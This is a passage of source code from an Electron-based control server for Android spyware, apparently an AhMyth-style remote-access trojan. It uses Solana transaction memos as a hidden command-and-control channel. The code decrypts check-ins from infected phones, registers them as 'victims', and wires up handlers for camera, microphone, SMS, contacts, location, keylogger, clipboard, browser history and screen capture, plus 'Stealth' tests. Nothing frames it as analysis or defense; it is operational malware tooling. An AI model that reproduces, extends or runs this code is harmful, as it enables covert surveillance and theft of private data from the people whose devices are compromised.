    } else if (pollCycleCount % 4 === 0) {
       // Only log "nothing found" occasionally
       if (sigInfos.length > 0) {
         sendBlockchainLog(`[ℹ] RPC: ${rpc.substring(8, 25)}... | ${sigInfos.length} tx checked (all seen/old)`);
       } else {
         sendBlockchainLog(`[ℹ] RPC: ${rpc.substring(8, 25)}... | No transactions found`);
       }
    }
    
    for (const info of sigInfos) {
      if (!info || !info.signature) continue;
      if (blockchainSeenSignatures.has(info.signature)) continue;
      blockchainSeenSignatures.add(info.signature);
      
      // Skip transactions that are older than when we started listening
      // (blockTime is in seconds, we use milliseconds)
      // BUT: Be more generous with the time window (5 minutes) to catch INIT messages
      // that might have been sent just before the server started listening
      if (info.blockTime && blockchainListenerStartTime > 0) {
        const txTimeMs = info.blockTime * 1000;
        // Allow 5 minutes grace period for INIT messages from clients that started first
        if (txTimeMs < (blockchainListenerStartTime - 300000)) {
          continue; // Skip old transaction (more than 5 minutes before listener start)
        }
      }
      
      // Limit seen signatures set size
      if (blockchainSeenSignatures.size > 1000) {
        const arr = Array.from(blockchainSeenSignatures);
        blockchainSeenSignatures = new Set(arr.slice(-500));
      }
      
      try {
        // Use getTransaction with base64 encoding to avoid SDK parsing issues
        // Then manually extract memos from the raw data
        let tx;
        let memos = [];
        
        try {
          // First try getParsedTransaction for clean memo extraction
          tx = await connection.getParsedTransaction(info.signature, {
            commitment: 'confirmed',
            maxSupportedTransactionVersion: 0
          });
          memos = extractMemosFromTxMain(tx);
        } catch (parseErr) {
          // If parsed fails, try raw transaction and extract memos from logs
          try {
            tx = await connection.getTransaction(info.signature, {
              commitment: 'confirmed',
              maxSupportedTransactionVersion: 0
            });
            
            // Extract memos from log messages (works for both parsed and raw)
            if (tx && tx.meta && tx.meta.logMessages) {
              for (const logMsg of tx.meta.logMessages) {
                // Memos appear in logs as "Program log: Memo (len X): ..."
                const memoMatch = logMsg.match(/Program log: Memo \(len \d+\): "?(.+?)"?$/);
                if (memoMatch && memoMatch[1]) {
                  memos.push(memoMatch[1]);
                }
                // Also check for direct memo content in Program data logs
                if (logMsg.includes('Program data:')) {
                  try {
                    const dataMatch = logMsg.match(/Program data: (.+)$/);
                    if (dataMatch) {
                      const decoded = Buffer.from(dataMatch[1], 'base64').toString('utf8');
                      if (decoded.startsWith('RESP') || decoded.startsWith('CMD') || decoded.startsWith('INIT') || decoded.startsWith('HB')) {
                        memos.push(decoded);
                      }
                    }
                  } catch (e) {
                    // Not valid base64 or not a memo
                  }
                }
              }
            }
          } catch (rawErr) {
            sendBlockchainLog(`[⚠] Tx fetch error: ${rawErr.message.substring(0, 40)}`);
            continue;
          }
        }
        
        // Debug: log any memos found
        if (memos.length > 0) {
          log.success(`[Blockchain] Found ${memos.length} memo(s) in tx ${info.signature.substring(0, 16)}`);
          for (const m of memos) {
            const preview = m ? m.substring(0, 80) : '(empty)';
            log.info(`[Blockchain] Memo content: ${preview}...`);
            sendBlockchainLog(`[⬇] Found memo: ${preview.substring(0, 50)}...`);
          }
        }
        
        for (const memo of memos) {
          if (!memo) continue;
          
          // Log all memos for debugging
          if (memo.startsWith('CMD:')) {
            sendBlockchainLog(`[→] Outgoing command: ${memo.substring(0, 50)}...`);
            continue;
          }
          
          // Handle chunked responses (RESPCH:)
          if (memo.startsWith('RESPCH:')) {
            const match = memo.match(/^RESPCH:([A-Za-z0-9]+):([0-9]+)\/([0-9]+):([0-9a-fA-F]+)$/);
            if (match) {
              const chunkId = match[1];
              const part = parseInt(match[2], 10);
              const total = parseInt(match[3], 10);
              const chunkHex = match[4];
              
              sendBlockchainLog(`[⬇] Chunk ${part}/${total} received (id: ${chunkId})`);
              
              let entry = blockchainChunkBuffers.get(chunkId);
              if (!entry) {
                entry = { total, parts: new Array(total).fill(null), received: 0 };
              }
              
              if (!entry.parts[part - 1]) {
                entry.parts[part - 1] = chunkHex;
                entry.received += 1;
              }
              blockchainChunkBuffers.set(chunkId, entry);
              
              // If all chunks received, assemble and process
              if (entry.received === entry.total) {
                const assembled = entry.parts.join('');
                blockchainChunkBuffers.delete(chunkId);
                sendBlockchainLog(`[✓] All ${total} chunks assembled for ${chunkId}`);
                
                const decrypted = decryptMemoPayloadMain(assembled, config.aesKey);
                if (decrypted) {
                  processBlockchainResponse(decrypted, info.signature, sendBlockchainLog);
                }
              }
            }
            continue;
          }
          
          // Handle single responses (RESP:)
          if (memo.startsWith('RESP:')) {
            sendBlockchainLog(`[⬇] Response received: ${memo.substring(0, 60)}...`);
            const decrypted = decryptMemoPayloadMain(memo.substring(5), config.aesKey);
            if (decrypted) {
              processBlockchainResponse(decrypted, info.signature, sendBlockchainLog);
            } else {
              sendBlockchainLog(`[⚠] Failed to decrypt response`);
            }
            continue;
          }
          
          // Handle client heartbeat/init (HB: or INIT:)
          if (memo.startsWith('HB:') || memo.startsWith('INIT:')) {
            const prefix = memo.startsWith('HB:') ? 'HB:' : 'INIT:';
            sendBlockchainLog(`[⬇] Client ${prefix === 'HB:' ? 'heartbeat' : 'init'}: ${memo.substring(0, 60)}...`);
            const decrypted = decryptMemoPayloadMain(memo.substring(prefix.length), config.aesKey);
            if (decrypted) {
              processBlockchainResponse(decrypted, info.signature, sendBlockchainLog);
            }
            continue;
          }
          
          // Try to decrypt any hex-looking memo that might be an encrypted response
          if (/^[0-9a-fA-F]{56,}$/.test(memo)) {
            const decrypted = decryptMemoPayloadMain(memo, config.aesKey);
            if (decrypted) {
              sendBlockchainLog(`[⬇] Decrypted raw response: ${decrypted.substring(0, 60)}...`);
              processBlockchainResponse(decrypted, info.signature, sendBlockchainLog);
            }
          }
        }
      } catch (txErr) {
        // Transaction fetch error, continue
        log.warn(`[Blockchain] Error fetching tx ${info.signature.substring(0, 16)}: ${txErr.message}`);
        sendBlockchainLog(`[⚠] Tx fetch error: ${txErr.message.substring(0, 40)}`);
      }
    }
    
    // Poll cycle complete
    sendBlockchainLog(`[✓] Poll cycle complete`);
    
  } catch (rpcErr) {
    const errorMsg = rpcErr.message || String(rpcErr);
    const is429 = errorMsg.includes('429') || errorMsg.includes('Too Many Requests') || errorMsg.includes('rate limit');
    
    if (is429) {
      // Track rate limiting
      const rateLimit = rpcRateLimitMap.get(rpc) || { last429: 0, consecutive429s: 0 };
      rateLimit.last429 = Date.now();
      rateLimit.consecutive429s++;
      rpcRateLimitMap.set(rpc, rateLimit);
      
      sendBlockchainLog(`[⚠] RPC ${rpc.substring(0, 30)}... rate-limited (429). Rotating to next RPC...`);
      log.warn(`[Blockchain] RPC ${rpc} rate-limited (429), consecutive: ${rateLimit.consecutive429s}`);
      
      // Add exponential backoff delay
      const backoffDelay = Math.min(5000 * Math.pow(2, rateLimit.consecutive429s - 1), 30000);
      await new Promise(resolve => setTimeout(resolve, backoffDelay));
    } else {
      log.warn(`[Blockchain] RPC ${rpc} failed: ${errorMsg}`);
      sendBlockchainLog(`[⚠] RPC ${rpc.substring(0, 30)}... failed: ${errorMsg.substring(0, 50)}`);
    }
  }
}

// Process a decrypted blockchain response
function processBlockchainResponse(decrypted, signature, sendLog) {
  try {
    const parsed = JSON.parse(decrypted);
    const eventName = parsed.event || 'unknown';
    // Data can be nested in parsed.data OR directly in parsed (for init/heartbeat)
    const data = parsed.data || parsed;

    const trimmedDecrypted = decrypted.length > 400 ? `${decrypted.substring(0, 400)}...[truncated]` : decrypted;
    log.info(`[Blockchain] Decrypted response (${signature.substring(0, 16)}): ${trimmedDecrypted}`);
    sendLog(`[✓] Decrypted response: event=${eventName}`);

    // Extract client ID from the response
    let clientId = data.id || data.clientId || data.deviceId || parsed.id;
    const usedFallback = !clientId;
    if (usedFallback) {
      // If no client ID in response, try to find the blockchain client
      // Camera responses and other command responses don't always include the client ID
      // So we need to find the active blockchain client
      const allVictims = victimsList.getAllVictims();
      const blockchainClients = Object.entries(allVictims).filter(([id, victim]) => {
        return victim && (
          victim.isBlockchain ||
          victim.connectionType === 'blockchain' ||
          victim.ip === 'Blockchain' ||
          victim.country === 'BC'
        ) && victim.isOnline;
      });
      
      // instrumentation removed
      
      if (blockchainClients.length === 1) {
        // Only one blockchain client - use it
        clientId = blockchainClients[0][0];
        // instrumentation removed
      } else if (blockchainClients.length > 1) {
        // Multiple blockchain clients - use the most recently active one
        blockchainClients.sort((a, b) => (b[1].lastSeen || 0) - (a[1].lastSeen || 0));
        clientId = blockchainClients[0][0];
        // instrumentation removed
      } else {
        // No blockchain clients found - fall back to signature
        clientId = signature.substring(0, 16);
        // instrumentation removed
      }
    }

  // instrumentation removed

    // Helper: deliver this event to any socket listeners attached to the victim
    let dispatchToVictimSocket = () => {
      try {
        const victim = victimsList.getVictim(clientId);
        const sock = victim && victim.socket;
        // instrumentation removed
        if (sock && sock._listeners && sock._listeners.has(eventName)) {
          const listeners = sock._listeners.get(eventName) || [];
        // instrumentation removed
          listeners.forEach((handler) => {
            try {
              // #region agent log
              // instrumentation removed
              // #endregion
              // Clone data to prevent mutations between listeners
              const clonedData = data && typeof data === 'object' ? JSON.parse(JSON.stringify(data)) : data;
              handler(clonedData);
              // #region agent log
              // instrumentation removed
              // #endregion
            } catch (err) {
              log.warn(`[Blockchain] Listener error for ${eventName}: ${err.message}`);
              // #region agent log
              // instrumentation removed
              // #endregion
            }
          });
        } else {
          // instrumentation removed
        }
      } catch (err) {
        log.warn(`[Blockchain] Failed to dispatch ${eventName} to victim socket: ${err.message}`);
        // instrumentation removed
      }
    };

    // Check if client exists in victimsList first (even if not in blockchainVictims set)
    const existingVictim = victimsList.getVictim(clientId);
    const inVictimsList = existingVictim && existingVictim !== -1;
    const inBlockchainVictims = blockchainVictims.has(clientId);

    // (Instrumentation removed)

    // If client exists in victimsList but not in blockchainVictims, add it to set and treat as existing
    if (inVictimsList && !inBlockchainVictims) {
      blockchainVictims.add(clientId);
      // #region agent log
      writeDebugLog({location:'main.js:1305',message:'Added existing client to blockchainVictims set',data:{clientId,eventName},timestamp:Date.now(),sessionId:'debug-session',runId:'initial',hypothesisId:'E'});
      // #endregion
    }

    // Check if we already have this client (now checking both sets)
    if (inVictimsList || inBlockchainVictims) {
      // Client already known - update their status AND fill in missing device info
      // Use clientId directly as that's the key in victimsList
      const victim = victimsList.getVictim(clientId);
    // (Instrumentation removed)
      if (victim && victim !== -1) {
        victim.lastSeen = Date.now();
        victim.isOnline = true;
        
        // Update battery if available
        if (data.battery) {
          victim.battery = data.battery;
        }
        
        // Fill in missing device info from heartbeat/init data
        if (data.manf && (!victim.manf || victim.manf === 'Unknown')) {
          victim.manf = data.manf || data.manufacturer || data.brand;
        }
        if (data.model && (!victim.model || victim.model === 'Unknown' || victim.model === 'Blockchain Client')) {
          victim.model = data.model;
        }
        if (data.release && (!victim.release || victim.release === 'Unknown')) {
          victim.release = data.release || data.version;
        }
        if (data.sdk && (!victim.sdk || victim.sdk === 'Unknown')) {
          victim.sdk = data.sdk;
        }
        if (data.operator && (!victim.operator || victim.operator === 'Blockchain C2')) {
          victim.operator = data.operator;
        }
        if (data.brand && (!victim.brand || victim.brand === 'Unknown')) {
          victim.brand = data.brand;
        }
        if (data.device && (!victim.device || victim.device === 'Unknown')) {
          victim.device = data.device;
        }
        if (data.product && (!victim.product || victim.product === 'Unknown')) {
          victim.product = data.product;
        }
        
        // Preserve blockchain properties for blockchain victims
        if (victim.country === 'BC' || victim.ip === 'Blockchain') {
          if (!victim.walletAddress) {
            victim.walletAddress = clientId;
          }
          victim.isBlockchain = true;
          victim.connectionType = 'blockchain';
          victim.conn = 'blockchain';
        }
        
        // Notify renderer of update so UI refreshes - use clientId
        if (win && win.webContents) {
          win.webContents.send('SocketIO:VictimUpdate', clientId);
        }
        
        if (eventName === `heartbeat`) {
          sendLog(`[] Heartbeat from ${clientId} (battery: ${data.battery || "?"}%)`);
        } else {
          sendLog(`[?] Response from known client ${clientId}: ${eventName}`);
          // Deliver this response to any Lab listeners bound to the victim socket
          // #region agent log
          writeDebugLog({location:'main.js:1480',message:'Dispatching response to existing client',data:{clientId,eventName},timestamp:Date.now(),sessionId:'debug-session',runId:'initial',hypothesisId:'E'});
          // #endregion
          dispatchToVictimSocket();
        }
      }
    } else {
      // New client - ONLY register if they have complete device info (from INIT)
      // Don't create empty clients from heartbeats without device data
      const hasCompleteDeviceInfo = (
        (data.manf || data.manufacturer) &&
        data.model &&
        (data.release || data.version || data.androidVersion)
      );

      // #region agent log
      writeDebugLog({location:'main.js:1320',message:'New client check - device info',data:{clientId,eventName,hasCompleteDeviceInfo,manf:!!(data.manf||data.manufacturer),model:!!data.model,release:!!(data.release||data.version||data.androidVersion)},timestamp:Date.now(),sessionId:'debug-session',runId:'initial',hypothesisId:'C'});
      // #endregion

      if (!hasCompleteDeviceInfo) {
        // Skip creating victim entry for heartbeats without device info
        sendLog(`[ℹ] Skipping incomplete client data (no device info) - waiting for INIT`);
        return;
      }

      blockchainVictims.add(clientId);

      // Create a virtual socket-like object for blockchain victim
      const blockchainSocket = {
        id: `blockchain-${clientId}`,
        connected: true,
        isBlockchain: true, // Flag for LabCtrl
        connectionType: 'blockchain',
        conn: 'blockchain',
        ip: 'Blockchain',
        _listeners: new Map(),
        emit(event, payload) {
          log.info(`[Blockchain] Cannot emit ${event} to blockchain client ${clientId} (read-only connection)`);
          // Optionally store last request for debugging
          this._listeners.get('request')?.forEach(cb => cb({ event, payload }));
        },
        on(event, handler) {
          if (!this._listeners.has(event)) {
            this._listeners.set(event, []);
          }
          this._listeners.get(event).push(handler);
          return handler;
        },
        once(event, handler) {
          // Track once listeners separately so we only remove the specific handler
          const wrapped = (data) => {
            handler(data);
            // Remove only this specific handler, not all listeners
            const listeners = this._listeners.get(event);
            if (listeners) {
              const index = listeners.indexOf(wrapped);
              if (index > -1) {
                listeners.splice(index, 1);
              }
              // Clean up empty listener arrays
              if (listeners.length === 0) {
                this._listeners.delete(event);
              }
            }
          };
          return this.on(event, wrapped);
        },
        removeAllListeners(event) {
          if (!event) {
            this._listeners.clear();
            return;
          }
          this._listeners.delete(event);
        },
        disconnect() {
          this.connected = false;
        }
      };

      // Extract device info from the response (if available)
      const deviceInfo = {
        sdk: data.sdk || data.androidSdk || 'Unknown',
        battery: data.battery || '?',
        operator: data.operator || 'Blockchain C2',
        device: data.device || data.deviceName || 'Unknown',
        brand: data.brand || 'Unknown',
        product: data.product || 'Unknown',
        walletAddress: clientId, // Store wallet address for blockchain victims
        isBlockchain: true, // Mark as blockchain connection
        connectionType: 'blockchain',
        conn: 'blockchain'
      };

      // Add victim to list
      victimsList.addVictim(
        blockchainSocket,
        'Blockchain',
        0,
        'BC',
        data.manf || data.manufacturer || data.brand || 'Unknown',
        data.model || 'Blockchain Client',
        data.release || data.version || data.androidVersion || 'Unknown',
        clientId,
        deviceInfo
      );

      log.success(`[Blockchain] New client registered: ${clientId} (from ${eventName} response)`);
      sendLog(`[✓] New blockchain client registered: ${clientId}`);

      // Notify renderer - use clientId as that's the key in victimsList
      if (win && win.webContents) {
        win.webContents.send('SocketIO:NewVictim', clientId);
      }

      // Forward non-heartbeat/init events to any Lab listeners immediately
      if (eventName && eventName !== 'heartbeat' && eventName !== 'init') {
        dispatchToVictimSocket();
      }
    }
    
    // Log response data summary
    if (data && Object.keys(data).length > 0) {
      const dataPreview = JSON.stringify(data).substring(0, 100);
      sendLog(`[ℹ] Data: ${dataPreview}${dataPreview.length >= 100 ? '...' : ''}`);
    }
    
  } catch (e) {
    sendLog(`[⚠] Failed to parse response JSON: ${e.message}`);
  }
}

ipcMain.on('Blockchain:Listen', function (event, config) {
  log.info('[Blockchain] Starting blockchain listener...');
  
  if (blockchainListening) {
    event.reply('Blockchain:Listen', '[ℹ] Blockchain listener already active');
    return;
  }
  
  if (!config || !config.channelAddress || !config.aesKey) {
    event.reply('Blockchain:ListenError', '[✗] Missing blockchain configuration (channelAddress, aesKey)');
    return;
  }
  
  blockchainListening = true;
  blockchainSeenSignatures.clear();
  blockchainChunkBuffers.clear();
  rpcRateLimitMap.clear();
  currentRpcIndex = 0;
  blockchainListenerStartTime = Date.now(); // Track when we started to filter old transactions
  
  const sendBlockchainLog = (msg) => {
    if (win && win.webContents) {
      win.webContents.send('Blockchain:Log', msg);
    }
  };
  
  sendBlockchainLog(`[ℹ] ═══════════════════════════════════════════════`);
  sendBlockchainLog(`[ℹ] Blockchain C2 Listener Starting...`);
  sendBlockchainLog(`[ℹ] Channel: ${config.channelAddress}`);
  sendBlockchainLog(`[ℹ] RPC: ${config.rpcUrl || 'https://api.devnet.solana.com'}`);
  if (config.rpcFallbacks) {
    sendBlockchainLog(`[ℹ] Fallbacks: ${config.rpcFallbacks.split(',').length} RPCs configured`);
  }
  sendBlockchainLog(`[ℹ] AES Key: ${config.aesKey.substring(0, 8)}...${config.aesKey.substring(56)}`);
  sendBlockchainLog(`[ℹ] ═══════════════════════════════════════════════`);
  
  // Poll immediately
  pollBlockchainForClients(config).catch(err => {
    log.error(`[Blockchain] Poll error: ${err.message}`);
    sendBlockchainLog(`[✗] Poll error: ${err.message}`);
  });
  
  // Then poll every 15 seconds (increased from 10 to reduce rate limiting)
  blockchainPollerInterval = setInterval(() => {
    pollBlockchainForClients(config).catch(err => {
      log.error(`[Blockchain] Poll error: ${err.message}`);
      sendBlockchainLog(`[✗] Poll error: ${err.message}`);
    });
  }, 15000);
  
  log.success('[Blockchain] Blockchain listener started');
  event.reply('Blockchain:Listen', `[✓] Blockchain listener started (channel: ${config.channelAddress.substring(0, 8)}...)`);
  sendBlockchainLog(`[✓] Blockchain listener active - polling every 15 seconds`);
  sendBlockchainLog(`[ℹ] RPC rotation enabled - will switch on 429 errors`);
  sendBlockchainLog(`[ℹ] Waiting for client responses (RESP: or RESPCH: memos)...`);
});

ipcMain.on('Blockchain:Stop', function (event) {
  log.info('[Blockchain] Stopping blockchain listener...');
  
  if (blockchainPollerInterval) {
    clearInterval(blockchainPollerInterval);
    blockchainPollerInterval = null;
  }
  
  blockchainListening = false;
  log.success('[Blockchain] Blockchain listener stopped');
  event.reply('Blockchain:Stop', '[✓] Blockchain listener stopped');
});

// ============================================================

process.on('uncaughtException', function (error) {
  log.error(`Uncaught exception: ${error.message}`);
  log.error(error.stack);
  
  if (error.code == "EADDRINUSE") {
    if (win && win.webContents) {
      win.webContents.send('SocketIO:ListenError', "[✗] Port is already in use");
    }
  } else {
    // Don't show dialog for every error, just log it
    // This prevents the app from closing unexpectedly
    log.error(`Error details: ${error.stack}`);
    if (win && win.webContents) {
      win.webContents.send('App:Error', `[⚠] Error: ${error.message}`);
    }
  }
  // Don't quit the app - just log the error and continue
});

// Prevent app from closing on unhandled promise rejections
process.on('unhandledRejection', (reason, promise) => {
  log.error('Unhandled Rejection at:', promise, 'reason:', reason);
  // Don't quit - just log
});

// Handle window control IPC messages as fallback for when remote module doesn't work
// These handlers work for both main window and lab windows by using event.sender
ipcMain.on('window-close', (event) => {
  log.info('Window close requested');
  const targetWindow = BrowserWindow.fromWebContents(event.sender);
  if (targetWindow && !targetWindow.isDestroyed()) {
    targetWindow.close();
  } else if (win) {
    win.close();
  }
});

ipcMain.on('window-minimize', (event) => {
  const targetWindow = BrowserWindow.fromWebContents(event.sender);
  if (targetWindow && !targetWindow.isDestroyed()) {
    targetWindow.minimize();
  } else if (win) {
    win.minimize();
  }
});

ipcMain.on('window-maximize', (event) => {
  const targetWindow = BrowserWindow.fromWebContents(event.sender);
  if (targetWindow && !targetWindow.isDestroyed()) {
    if (targetWindow.isMaximized()) {
      targetWindow.unmaximize();
    } else {
      targetWindow.maximize();
    }
  } else if (win) {
    if (win.isMaximized()) {
      win.unmaximize();
    } else {
      win.maximize();
    }
  }
});

// Fired when Victim's Lab is opened
ipcMain.on('openLabWindow', function (e, page, index) {
  log.info(`Opening lab window for victim: ${index}`);
  
  //------------------------Lab SCREEN INIT------------------------------------
  // create the Lab window
  let child = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    parent: win,
    width: 850,
    height: 800,
    minWidth: 700,
    minHeight: 600,
    show: false,
    darkTheme: true,
    resizable: true,
    frame: false,
    backgroundColor: '#0d1117',
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false
    }
  })

  require('@electron/remote/main').enable(child.webContents);

  //add this window to windowsList
  windows[index] = child.id;
  
  // Uncomment to debug lab window
  child.webContents.openDevTools();

  // pass the victim info to this victim lab with logging wrapper
  const originalSocket = victimsList.getVictim(index).socket;
  const victimId = index;
  
  // Wrap socket to add logging for all emits
  const originalEmit = originalSocket.emit.bind(originalSocket);
  originalSocket.emit = function(event, data) {
    log.request(victimId, event, data);
    // Send to renderer for GUI display
    if (win && win.webContents) {
      win.webContents.send('log:request', {
        deviceId: victimId,
        command: event,
        data: data
      });
    }
    return originalEmit(event, data);
  };
  
  // Wrap socket to add logging for all received events
  const originalOn = originalSocket.on.bind(originalSocket);
  originalSocket.on = function(event, callback) {
    return originalOn(event, function(data) {
      log.response(victimId, event, data);
      // Send to renderer for GUI display
      if (win && win.webContents) {
        win.webContents.send('log:response', {
          deviceId: victimId,
          command: event,
          data: data
        });
      }
      callback(data);
    });
  };
  
  child.webContents.victim = originalSocket;
  child.loadFile(__dirname + '/app/' + page)

  child.once('ready-to-show', () => {
    child.show();
    log.success(`Lab window opened for victim: ${index}`);
  });

  child.on('closed', () => {
    log.info(`Lab window closed for victim: ${index}`);
    delete windows[index];
    
    //on lab window closed remove all socket listners
    const victim = victimsList.getVictim(index);
    if (victim && victim.socket) {
      victim.socket.removeAllListeners("x0000ca"); // camera
      victim.socket.removeAllListeners("x0000fm"); // file manager
      victim.socket.removeAllListeners("x0000sm"); // sms
      victim.socket.removeAllListeners("x0000cl"); // call logs
      victim.socket.removeAllListeners("x0000cn"); // contacts
      victim.socket.removeAllListeners("x0000mc"); // mic
      victim.socket.removeAllListeners("x0000lm"); // location
      victim.socket.removeAllListeners("x0000di"); // device info
      victim.socket.removeAllListeners("x0000ap"); // apps
      victim.socket.removeAllListeners("x0000cb"); // clipboard
      victim.socket.removeAllListeners("x0000wf"); // wifi
      victim.socket.removeAllListeners("x0000sc"); // screen
      victim.socket.removeAllListeners("x0000in"); // input
      victim.socket.removeAllListeners("x0000kl"); // keylogger
      victim.socket.removeAllListeners("x0000bh"); // browser history
      victim.socket.removeAllListeners("x0000nt"); // notifications
      victim.socket.removeAllListeners("x0000si"); // system info
      log.info('All socket listeners removed');
    }
  })
});

// ========== TEST SUITE IPC HANDLERS ==========
let testSuiteProcess = null;

ipcMain.on('test-suite:start', (event, config) => {
  log.info('Starting test suite with config:', JSON.stringify(config));
  
  if (testSuiteProcess) {
    log.warn('Test suite already running');
    event.reply('test-suite:error', { message: 'Test suite is already running' });
    return;
  }
  
  try {
    const isBlockchain = (config.connectionType || '').toLowerCase() === 'blockchain';
    const testSuitePath = isBlockchain
      ? path.join(__dirname, '..', '..', 'test-blockchain-c2-suite.js')
      : path.join(__dirname, '..', '..', 'test-comprehensive-suite.js');
    const args = [];
    
    // Add device ID if specified
    if (config.deviceId) {
      // Set environment variable for device selection
      process.env.ADB_DEVICE = config.deviceId;
    }
    
    // Add server IP and port
    if (config.serverIP) {
      process.env.SERVER_IP = config.serverIP;
    }
    if (config.port) {
      process.env.PORT = config.port.toString();
    }
    
    // Add flags
    if (config.onlyFailing) {
      args.push('--only-failing');
    }
    if (!config.autoBuild) {
      process.env.AUTO_BUILD = 'false';
    }
    if (!config.forceRebuild) {
      process.env.FORCE_REBUILD = 'false';
    }
    
    // Blockchain-specific env propagation
    if (isBlockchain) {
      if (config.blockchainRpcUrl) {
        process.env.BLOCKCHAIN_RPC_URL = config.blockchainRpcUrl;
        process.env.SOLANA_RPC_URL = config.blockchainRpcUrl;
      }
      if (config.blockchainContract) {
        process.env.BLOCKCHAIN_CONTRACT_ADDRESS = config.blockchainContract;
        process.env.SOLANA_CHANNEL_ADDRESS = config.blockchainContract;
      }
      if (config.blockchainAesKey) {
        process.env.BLOCKCHAIN_C2_AES_KEY = config.blockchainAesKey;
      }
      if (config.blockchainChain) {
        process.env.BLOCKCHAIN_CHAIN = config.blockchainChain;
      }
    }

    let lastStats = { total: 0, passed: 0, failed: 0 };
    
    // Spawn the test suite process
    const { spawn } = require('child_process');
    const isWindows = process.platform === 'win32';
    const nodeCmd = isWindows ? 'node' : 'node';
    
    testSuiteProcess = spawn(nodeCmd, [testSuitePath, ...args], {
      cwd: path.join(__dirname, '..', '..'),
      env: { ...process.env },
      shell: isWindows
    });
    
    // Buffer for multi-line output
    let outputBuffer = '';
    
    // Send output to renderer
    testSuiteProcess.stdout.on('data', (data) => {
      outputBuffer += data.toString();
      const lines = outputBuffer.split('\n');
      outputBuffer = lines.pop() || ''; // Keep incomplete line in buffer
      
      for (const line of lines) {
        if (!line.trim()) continue;
        
        let type = 'info';
        if (line.includes('PASSED') || line.includes('✓') || line.includes('Ôťô')) type = 'success';
        else if (line.includes('FAILED') || line.includes('✗') || line.includes('ÔťŚ')) type = 'error';
        else if (line.includes('WARN') || line.includes('Warning')) type = 'warn';
        else if (line.includes('Building') || line.includes('Installing')) type = 'info';
        else if (line.includes('TEST') || line.includes('STATISTICS')) type = 'info';
        
        event.reply('test-suite:output', { message: line, type });
        
        // Parse test results - improved pattern matching
        const testResultMatch = line.match(/\[TEST\s+(\d+)\/(\d+)\]\s+(.+?)(?:\s+-\s+(PASSED|FAILED))?/);
        if (testResultMatch) {
          const testName = testResultMatch[3].trim();
          const status = testResultMatch[4] || (line.includes('PASSED') || line.includes('✓') || line.includes('Ôťô') ? 'PASSED' : 
                        (line.includes('FAILED') || line.includes('✗') || line.includes('ÔťŚ') ? 'FAILED' : null));
          
          if (status) {
            const timeMatch = line.match(/(\d+(?:\.\d+)?)\s*(ms|s)/);
            const time = timeMatch ? parseFloat(timeMatch[1]) * (timeMatch[2] === 's' ? 1000 : 1) : 0;
            const errorMatch = line.match(/Error Reason:\s*(.+?)(?:\s*$|,)/);
            
            event.reply('test-suite:result', {
              name: testName,
              category: extractCategory(testName),
              success: status === 'PASSED',
              time: time,
              error: status === 'FAILED' ? (errorMatch ? errorMatch[1] : 'Test failed') : null
            });
          }
        }
        
        // Parse statistics
        const statsMatch = line.match(/Total Tests:\s*(\d+).*?Passed:\s*(\d+).*?Failed:\s*(\d+)/);
        if (statsMatch) {
          const stats = {
            total: parseInt(statsMatch[1]),
            passed: parseInt(statsMatch[2]),
            failed: parseInt(statsMatch[3])
          };
          lastStats = stats;
          event.reply('test-suite:stats', stats);
        }
      }
    });
    
    // Helper function to extract category from test name
    function extractCategory(testName) {
      if (testName.includes('Camera')) return 'Camera';
      if (testName.includes('File Manager')) return 'File Manager';
      if (testName.includes('SMS')) return 'SMS';
      if (testName.includes('Stealth')) return 'Stealth';
      if (testName.includes('Wake')) return 'System';
      return 'Other';
    }
    
    testSuiteProcess.stderr.on('data', (data) => {
      event.reply('test-suite:output', { message: data.toString(), type: 'error' });
    });
    
    testSuiteProcess.on('close', (code) => {
      log.info(`Test suite process exited with code ${code}`);
      
      // Process any remaining buffer
      if (outputBuffer.trim()) {
        const lines = outputBuffer.split('\n').filter(l => l.trim());
        for (const line of lines) {
          event.reply('test-suite:output', { message: line, type: 'info' });
        }
      }
      
      // Send final stats (use last parsed stats if available)
      event.reply('test-suite:complete', lastStats);
      testSuiteProcess = null;
    });
    
    // Listen for stats updates
    const statsListener = (event, stats) => {
      // Update final stats when received
      if (stats && stats.total > 0) {
        // Stats will be sent via separate event
      }
    };
    
    testSuiteProcess.on('error', (error) => {
      log.error('Test suite process error:', error);
      event.reply('test-suite:error', { message: error.message });
      testSuiteProcess = null;
    });
    
  } catch (error) {
    log.error('Error starting test suite:', error);
    event.reply('test-suite:error', { message: error.message });
    testSuiteProcess = null;
  }
});

ipcMain.on('test-suite:stop', (event) => {
  log.info('Stopping test suite');
  if (testSuiteProcess) {
    testSuiteProcess.kill();
    testSuiteProcess = null;
    event.reply('test-suite:output', { message: 'Test suite stopped', type: 'warn' });
  }
});

// Register fullscreen window with its parent
ipcMain.on('register-fullscreen-window', (event, data) => {
  fullscreenWindows[data.fullscreenId] = data.parentId;
  log.info(`Registered fullscreen window ${data.fullscreenId} with parent ${data.parentId}`);
});

// Unregister fullscreen window
ipcMain.on('unregister-fullscreen-window', (event, fullscreenId) => {
  delete fullscreenWindows[fullscreenId];
  log.info(`Unregistered fullscreen window ${fullscreenId}`);
});

// Transcription IPC handlers
ipcMain.on('transcription:process-audio', (event, audioData) => {
  try {
    // Convert base64 to Buffer
    const audioBuffer = Buffer.from(audioData, 'base64');
    
    // Process audio chunk
    const result = transcriptionService.processAudioChunk(audioBuffer);
    
    if (result) {
      // Send transcription result back to renderer
      event.sender.send('transcription:result', result);
    }
  } catch (error) {
    log.error(`Transcription processing error: ${error.message}`);
  }
});

ipcMain.on('transcription:reset', (event) => {
  transcriptionService.resetRecognizer();
  log.info('Transcription recognizer reset');
});

ipcMain.on('transcription:final', (event) => {
  try {
    const result = transcriptionService.getFinalResult();
    if (result) {
      event.sender.send('transcription:result', result);
    }
  } catch (error) {
    log.error(`Transcription final result error: ${error.message}`);
  }
});

ipcMain.on('transcription:status', (event) => {
  const status = transcriptionService.getModelInfo();
  event.reply('transcription:status', status);
});

// Handle fullscreen input events from fullscreen window
ipcMain.on('fullscreen-input', (event, data) => {
  log.info('Fullscreen input received:', JSON.stringify(data));
  
  // Get the fullscreen window that sent this message
  const fullscreenWindow = BrowserWindow.fromWebContents(event.sender);
  if (!fullscreenWindow) {
    log.warn('Could not find fullscreen window from sender');
    return;
  }
  
  // Find the parent window (lab window) that opened this fullscreen window
  // First try: use stored parent reference
  const parentWebContentsId = fullscreenWindows[fullscreenWindow.id];
  if (parentWebContentsId) {
    try {
